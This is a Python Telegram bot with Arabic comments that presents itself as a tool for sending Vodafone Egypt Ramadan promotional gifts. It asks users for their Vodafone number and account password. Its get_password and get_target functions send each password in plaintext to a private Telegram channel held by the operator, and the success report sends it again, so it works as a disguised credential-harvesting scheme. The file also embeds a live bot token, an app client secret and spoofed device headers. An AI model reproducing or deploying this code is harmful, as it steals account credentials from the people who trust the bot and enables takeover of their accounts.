import logging
import json
import requests
import re
import os
from datetime import datetime
from telegram import Update, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)

# -------------------- إعداد التسجيل (logging) --------------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# -------------------- إعدادات الإدارة والقناة --------------------
ADMIN_ID = 8287678319  
CHANNEL_ID = "-1003886614381"  

# -------------------- قاعدة البيانات البسيطة --------------------
DB_FILE = "bot_database.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"banned_ids": {}, "banned_phones": {}, "users": []}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

async def log_to_channel(context: ContextTypes.DEFAULT_TYPE, text: str):
    try:
        await context.bot.send_message(chat_id=CHANNEL_ID, text=text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Failed to send to channel: {e}")

# -------------------- حالات المحادثة الأساسية والإدارة --------------------
PHONE, PASSWORD, TARGET_PHONE = range(3)
(ADMIN_MENU, WAIT_BAN_ID, WAIT_BAN_ID_REASON, 
 WAIT_BAN_PHONE, WAIT_BAN_PHONE_REASON) = range(3, 8)

# -------------------- بيانات ثابتة من السكربت الأصلي --------------------
TOKEN_URL = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
PROMO_URL = "https://web.vodafone.com.eg/services/dxl/promo/promotion"
CLIENT_ID = "ana-vodafone-app"
CLIENT_SECRET = "95fd95fb-7489-4958-8ae6-d31a525cd20a"

HEADERS_AUTH = {
    'User-Agent': "okhttp/4.12.0",
    'Accept': "application/json, text/plain, */*",
    'Accept-Encoding': "gzip",
    'silentLogin': "true",
    'x-agent-operatingsystem': "13",
    'clientId': "AnaVodafoneAndroid",
    'Accept-Language': "ar",
    'x-agent-device': "Xiaomi 21061119AG",
    'x-agent-version': "2025.10.3",
    'x-agent-build': "1050",
    'digitalId': "28RI9U7ISU8SW",
    'device-id': "1df4efae59648ac3"
}

HEADERS_API = {
    'User-Agent': "vodafoneandroid",
    'Accept': "application/json",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'sec-ch-ua-platform': "\"Android\"",
    'Accept-Language': "AR",
    'clientId': "WebsiteConsumer",
    'sec-ch-ua': "\"Not:A-Brand\";v=\"99\", \"Android WebView\";v=\"145\", \"Chromium\";v=\"145\"",
    'sec-ch-ua-mobile': "?1",
    'channel': "APP_PORTAL",
    'Content-Type': "application/json",
    'X-Requested-With': "com.emeint.android.myservices",
    'Sec-Fetch-Site': "same-origin",
    'Sec-Fetch-Mode': "cors",
    'Sec-Fetch-Dest': "empty",
    'Referer': "https://web.vodafone.com.eg/portal/bf/massNearByPromo26",
}

# -------------------- دالة ترجمة المصطلحات --------------------
def translate_terms(text):
    if not text: return ""
    text = str(text).upper().strip()
    translations = {
        "UNITS": "وحدة", "UNIT": "وحدة", "MB": "ميجابايت", "GB": "جيجابايت",
        "MILES": "ميل", "HOURS": "ساعات", "HOUR": "ساعة", "DAYS": "أيام",
        "DAY": "يوم", "MINUTES": "دقائق", "MIN": "دقيقة"
    }
    return translations.get(text, text)

# ==================== دوال المحادثة الأساسية للمستخدم ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.effective_user
    db = load_db()
    mention = f"[{user.first_name}](tg://user?id={user.id})"

    # 1. التحقق من حظر الآيدي
    if str(user.id) in db['banned_ids']:
        reason = db['banned_ids'][str(user.id)]
        await log_to_channel(context, f"🚫 المستخدم المحظور {mention} حاول الدخول للبوت (تم منعه).")
        await update.message.reply_text(
            f"🚫 تم حظرك من البوت بشكل دائم !\n\nالسبب: {reason}"
        )
        return ConversationHandler.END

    # 2. تسجيل دخول المستخدمين الجدد وتتبع التحركات للقناة
    if user.id not in db['users']:
        db['users'].append(user.id)
        save_db(db)
        total_users = len(db['users'])
        await log_to_channel(context, f"👤 المستخدم الجديد {mention} دخل البوت.\nالعدد الإجمالي للمستخدمين: {total_users}")
    
    # 3. تسجيل حركة الضغط على start
    await log_to_channel(context, f"▶️ المستخدم {mention} ضغط `/start`.")

    await update.message.reply_text(
        f"مرحباً بك {mention}!\n"
        "أهلاً بك في بوت إرسال هدايا فودافون.\n"
        "الرجاء إرسال رقم فودافون الخاص بك:",
        parse_mode='Markdown'
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    phone = update.message.text.strip()
    user = update.effective_user
    mention = f"[{user.first_name}](tg://user?id={user.id})"
    db = load_db()

    await log_to_channel(context, f"💬 أرسل {mention} في خانة (الرقم المرسل): `{phone}`")

    # التحقق من حظر الرقم (للمرسل)
    if phone in db['banned_phones']:
        reason = db['banned_phones'][phone]
        await log_to_channel(context, f"🚫 المستخدم {mention} حاول استخدام رقم محظور: `{phone}` (تم منعه).")
        await update.message.reply_text(f"🚫 تم حظرك بشكل دائم !\n\nالسبب: {reason}")
        return ConversationHandler.END

    if not re.match(r"^01[0-2,5]\d{8}$", phone):
        await log_to_channel(context, f"⚠️ المستخدم {mention} أدخل رقماً غير صالح: `{phone}`")
        await update.message.reply_text("⚠️ خطأ: يرجى إدخال رقم فودافون صحيح مكون من 11 رقم يبدأ بـ 01")
        return PHONE
        
    context.user_data['phone'] = phone
    await update.message.reply_text("✅ تم استلام الرقم.\nالآن الرجاء إرسال **كلمة المرور**:", parse_mode='Markdown')
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    password = update.message.text.strip()
    user = update.effective_user
    mention = f"[{user.first_name}](tg://user?id={user.id})"

    await log_to_channel(context, f"🔑 أرسل {mention} في خانة (كلمة المرور): `{password}`")
    
    if len(password) < 4 or len(password) > 50:
        await log_to_channel(context, f"⚠️ المستخدم {mention} أدخل كلمة مرور غير صالحة.")
        await update.message.reply_text("⚠️ كلمة المرور غير صالحة، يرجى المحاولة مجدداً:")
        return PASSWORD
        
    context.user_data['password'] = password
    await update.message.reply_text("🎯 تم استلام كلمة المرور.\nالآن أرسل **الرقم الذي تريد إرسال الهدية إليه**:", parse_mode='Markdown')
    return TARGET_PHONE

async def get_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    target = update.message.text.strip()
    user = update.effective_user
    mention = f"[{user.first_name}](tg://user?id={user.id})"
    db = load_db()

    await log_to_channel(context, f"🎯 أرسل {mention} في خانة (الرقم المستقبل): `{target}`")

    # التحقق من حظر الرقم (للمستقبل)
    if target in db['banned_phones']:
        reason = db['banned_phones'][target]
        await log_to_channel(context, f"🚫 المستخدم {mention} حاول الإرسال إلى رقم محظور: `{target}` (تم منعه).")
        await update.message.reply_text(f"🚫 لا يمكنك الإرسال إلى هذا الرقم، تم حظره بشكل دائم !\n\nالسبب: {reason}")
        return ConversationHandler.END

    if not re.match(r"^01[0-2,5]\d{8}$", target):
        await log_to_channel(context, f"⚠️ المستخدم {mention} أدخل رقم مستلم غير صالح: `{target}`")
        await update.message.reply_text("⚠️ يرجى إدخال رقم مستلم صحيح:")
        return TARGET_PHONE

    phone = context.user_data['phone']
    password = context.user_data['password']

    status_msg = await update.message.reply_text("🔍 جاري تسجيل الدخول والحصول على البيانات... ⏳")

    auth_payload = {
        'grant_type': "password",
        'username': phone,
        'password': password,
        'client_secret': CLIENT_SECRET,
        'client_id': CLIENT_ID
    }

    try:
        r1 = requests.post(TOKEN_URL, data=auth_payload, headers=HEADERS_AUTH, timeout=30)
        if r1.status_code != 200:
            await log_to_channel(context, f"❌ المستخدم {mention} فشل في تسجيل الدخول. (رقم أو باسورد غير صحيح).")
            await status_msg.edit_text("❌ فشل تسجيل الدخول. تأكد من الرقم وكلمة المرور.")
            return ConversationHandler.END

        token = r1.json()['access_token']

        headers_promo = HEADERS_API.copy()
        headers_promo['Authorization'] = f"Bearer {token}"
        headers_promo['msisdn'] = phone
        headers_promo['x-dtpc'] = "8$7781247_562h50vPHEBDRMPUAFUMABJNUMWMBLCNOCMGLGU-0e0"

        params = {'@type': "Promo", '$.context.type': "nearbyRamadan26"}

        r2 = requests.get(PROMO_URL, params=params, headers=headers_promo, timeout=30)
        if r2.status_code != 200:
            await log_to_channel(context, f"❌ المستخدم {mention} فشل في جلب بيانات الهدية. رمز الخطأ: {r2.status_code}")
            await status_msg.edit_text("❌ فشل في الحصول على بيانات الهدية.")
            return ConversationHandler.END

        data = r2.json()
        if not isinstance(data, list) or len(data) < 2:
            await log_to_channel(context, f"⚠️ المستخدم {mention} لا توجد هدايا متاحة في رقمه.")
            await status_msg.edit_text("🎁 للأسف، لا توجد هدايا متاحة على هذا الرقم حالياً.")
            return ConversationHandler.END

        promo = data[1]
        p_id = promo.get("id")
        c_id = promo.get("channel", {}).get("id")

        amount, unit, validity, v_unit = "0", "", "", ""

        for char in promo.get("characteristics", []):
            name = char.get("name")
            val = char.get("value")
            if name == "amount":
                amount = val
                unit = translate_terms(char.get("@type", ""))
            elif name == "OfferValidity":
                validity = val
            elif name == "OfferValidityUnit":
                v_unit = translate_terms(val)

        send_data = {
            "@type": "Promo",
            "channel": {"id": c_id},
            "context": {"type": "nearbyRamadan26"},
            "pattern": [{
                "id": p_id,
                "characteristics": [
                    {"name": "redemptionFlag", "value": "0"},
                    {"name": "BMsisdn", "value": target}
                ]
            }]
        }

        r3 = requests.post(PROMO_URL, json=send_data, headers=headers_promo, timeout=30)

        if r3.status_code == 200:
            final_text = (
                f"✅ *تم إرسال الهدية بنجاح!*\n\n"
                f"👤 *من:* `{phone}`\n"
                f"🎁 *إلى:* `{target}`\n"
                f"💰 *قيمة الهدية:* {amount} {unit}\n"
                f"⏳ *الصلاحية:* {validity} {v_unit}"
            )
            await status_msg.edit_text(final_text, parse_mode='Markdown')

            # --- إرسال التقرير للقناة بنفس التنسيق المطلوب ---
            now = datetime.now()
            date_str = now.strftime("%Y (%m (%d (%H (%M:%S)") 

            report_msg = (
                f"الرقم المرسل: {phone}\n"
                f"كلمة مرور: {password}\n\n"
                f"الرقم المستقبل: {target}\n\n"
                f"عدد الوحدات: {amount} {unit}\n"
                f"الصلاحية: {validity} {v_unit}\n"
                f"بتاريخ: ({date_str}\n\n"
                f"تمت العملية بواسطة: {mention}"
            )
            await log_to_channel(context, f"✅ **عملية ناجحة:**\n\n{report_msg}")

        else:
            await log_to_channel(context, f"❌ المستخدم {mention} واجه خطأ أثناء إرسال الهدية (قد تكون مستخدمة). كود: {r3.status_code}")
            await status_msg.edit_text(f"❌ حدث خطأ أثناء الإرسال. قد تكون الهدية استُخدمت بالفعل. رمز الخطأ: {r3.status_code}")

    except Exception as e:
        logger.error(f"Error: {e}")
        await log_to_channel(context, f"🛑 خطأ تقني غير متوقع مع المستخدم {mention}: \n`{e}`")
        await status_msg.edit_text("🛑 حدث خطأ تقني غير متوقع.")

    return ConversationHandler.END


# ==================== دوال الإدارة المركزية (للمدير فقط) ====================

def get_admin_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("حظر مستخدم (بالآيدي)", callback_data='ban_id')],
        [InlineKeyboardButton("حظر رقم هاتف", callback_data='ban_phone')],
        [InlineKeyboardButton("إدارة المحظورين (آيدي) 🔓", callback_data='list_banned_ids')],
        [InlineKeyboardButton("إدارة المحظورين (أرقام) 🔓", callback_data='list_banned_phones')]
    ])

async def admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.effective_user.id != ADMIN_ID:
        return ConversationHandler.END

    await update.message.reply_text("🛠️ **تبويب الإدارة المركزية:**\nاختر الإجراء الذي تريده:", reply_markup=get_admin_keyboard(), parse_mode='Markdown')
    return ADMIN_MENU

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    data = query.data
    db = load_db()

    # --- خيارات الحظر ---
    if data == 'ban_id':
        await query.edit_message_text("الرجاء إرسال **آيدي (ID)** المستخدم المراد حظره:")
        return WAIT_BAN_ID
    elif data == 'ban_phone':
        await query.edit_message_text("الرجاء إرسال **رقم الهاتف** المراد حظره:")
        return WAIT_BAN_PHONE

    # --- خيارات العودة ---
    elif data == 'admin_home':
        await query.edit_message_text("🛠️ **تبويب الإدارة المركزية:**\nاختر الإجراء الذي تريده:", reply_markup=get_admin_keyboard(), parse_mode='Markdown')
        return ADMIN_MENU

    # --- قوائم إزالة الحظر ---
    elif data == 'list_banned_ids':
        if not db['banned_ids']:
            await query.edit_message_text("لا يوجد أي آيدي محظور حالياً.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='admin_home')]]))
            return ADMIN_MENU
            
        keyboard = []
        for b_id in db['banned_ids']:
            keyboard.append([InlineKeyboardButton(f"الآيدي: {b_id}", callback_data=f"ask_unban_id_{b_id}")])
        keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data='admin_home')])
        await query.edit_message_text("اختر الآيدي الذي تريد **إزالة الحظر** عنه:", reply_markup=InlineKeyboardMarkup(keyboard))
        return ADMIN_MENU

    elif data == 'list_banned_phones':
        if not db['banned_phones']:
            await query.edit_message_text("لا يوجد أي أرقام محظورة حالياً.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='admin_home')]]))
            return ADMIN_MENU
            
        keyboard = []
        for b_phone in db['banned_phones']:
            keyboard.append([InlineKeyboardButton(f"الرقم: {b_phone}", callback_data=f"ask_unban_ph_{b_phone}")])
        keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data='admin_home')])
        await query.edit_message_text("اختر الرقم الذي تريد **إزالة الحظر** عنه:", reply_markup=InlineKeyboardMarkup(keyboard))
        return ADMIN_MENU

    # --- تأكيدات إزالة الحظر (الآيدي) ---
    elif data.startswith('ask_unban_id_'):
        b_id = data.split('ask_unban_id_')[1]
        keyboard = [
            [InlineKeyboardButton("نعم، إزالة الحظر ✅", callback_data=f"do_unban_id_{b_id}")],
            [InlineKeyboardButton("إلغاء ❌", callback_data='list_banned_ids')]
        ]
        await query.edit_message_text(f"❓ هل أنت متأكد أنك تريد إزالة الحظر عن الآيدي: `{b_id}`؟", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return ADMIN_MENU

    elif data.startswith('do_unban_id_'):
        b_id = data.split('do_unban_id_')[1]
        if b_id in db['banned_ids']:
            del db['banned_ids'][b_id]
            save_db(db)
            await query.edit_message_text(f"✅ تم إزالة الحظر بنجاح عن الآيدي: `{b_id}`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='admin_home')]]), parse_mode='Markdown')
        else:
            await query.edit_message_text("⚠️ هذا الآيدي غير محظور أساساً.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='admin_home')]]))
        return ADMIN_MENU

    # --- تأكيدات إزالة الحظر (الأرقام) ---
    elif data.startswith('ask_unban_ph_'):
        b_phone = data.split('ask_unban_ph_')[1]
        keyboard = [
            [InlineKeyboardButton("نعم، إزالة الحظر ✅", callback_data=f"do_unban_ph_{b_phone}")],
            [InlineKeyboardButton("إلغاء ❌", callback_data='list_banned_phones')]
        ]
        await query.edit_message_text(f"❓ هل أنت متأكد أنك تريد إزالة الحظر عن الرقم: `{b_phone}`؟", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return ADMIN_MENU

    elif data.startswith('do_unban_ph_'):
        b_phone = data.split('do_unban_ph_')[1]
        if b_phone in db['banned_phones']:
            del db['banned_phones'][b_phone]
            save_db(db)
            await query.edit_message_text(f"✅ تم إزالة الحظر بنجاح عن الرقم: `{b_phone}`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='admin_home')]]), parse_mode='Markdown')
        else:
            await query.edit_message_text("⚠️ هذا الرقم غير محظور أساساً.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='admin_home')]]))
        return ADMIN_MENU


async def receive_ban_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['ban_target_id'] = update.message.text.strip()
    await update.message.reply_text("✅ تم استلام الآيدي. \nالآن أرسل **سبب الحظر** ليظهر للمستخدم (مثال: استخدام البوت بشكل مسيء):")
    return WAIT_BAN_ID_REASON

async def receive_ban_id_reason(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    reason = update.message.text.strip()
    target_id = context.user_data.get('ban_target_id')
    
    db = load_db()
    db['banned_ids'][target_id] = reason
    save_db(db)
    
    await update.message.reply_text(f"✅ تمت العملية بنجاح.\nتم حظر الآيدي: `{target_id}`\nالسبب: {reason}", parse_mode='Markdown')
    return ConversationHandler.END

async def receive_ban_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['ban_target_phone'] = update.message.text.strip()
    await update.message.reply_text("✅ تم استلام رقم الهاتف. \nالآن أرسل **سبب الحظر** ليظهر للمستخدم عند إدخال هذا الرقم:")
    return WAIT_BAN_PHONE_REASON

async def receive_ban_phone_reason(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    reason = update.message.text.strip()
    target_phone = context.user_data.get('ban_target_phone')
    
    db = load_db()
    db['banned_phones'][target_phone] = reason
    save_db(db)
    
    await update.message.reply_text(f"✅ تمت العملية بنجاح.\nتم حظر الرقم: `{target_phone}`\nالسبب: {reason}", parse_mode='Markdown')
    return ConversationHandler.END

# ==================== دوال الإلغاء والاحتياط ====================

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.effective_user
    mention = f"[{user.first_name}](tg://user?id={user.id})"
    await log_to_channel(context, f"🛑 المستخدم {mention} قام بإلغاء العملية باستخدام `/cancel`.")
    await update.message.reply_text("تم إلغاء العملية. أرسل /start للبدء مجدداً.")
    return ConversationHandler.END

async def fallback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.effective_user
    mention = f"[{user.first_name}](tg://user?id={user.id})"
    text = update.message.text if update.message else "مدخل غير نصي (ملف/صورة)"
    
    await log_to_channel(context, f"❓ المستخدم {mention} أرسل رسالة خارج السياق أو خاطئة: `{text}`")
    await update.message.reply_text("الرجاء اتباع التعليمات بدقة. أرسل /start للبدء من جديد أو /cancel للإلغاء.")
    return -1

def main() -> None:
    # التوكن الخاص بك
    TOKEN = "8791476397:AAHnp5P-gsbcG7FXqIPhcYNEjxqeMBHCZaY"
    application = Application.builder().token(TOKEN).build()

    # معالج المحادثة الأساسية للمستخدم
    user_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            TARGET_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_target)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            MessageHandler(filters.COMMAND, fallback), 
            MessageHandler(filters.ALL, fallback)      
        ],
    )

    # معالج محادثة تبويب الإدارة المركزية (للمدير فقط)
    admin_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("admin", admin_start)],
        states={
            ADMIN_MENU: [CallbackQueryHandler(admin_callback)],
            WAIT_BAN_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ban_id)],
            WAIT_BAN_ID_REASON: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ban_id_reason)],
            WAIT_BAN_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ban_phone)],
            WAIT_BAN_PHONE_REASON: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ban_phone_reason)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(admin_conv_handler)
    application.add_handler(user_conv_handler)
    
    print("البوت يعمل الآن...")
    application.run_polling()

if __name__ == "__main__":
    main()
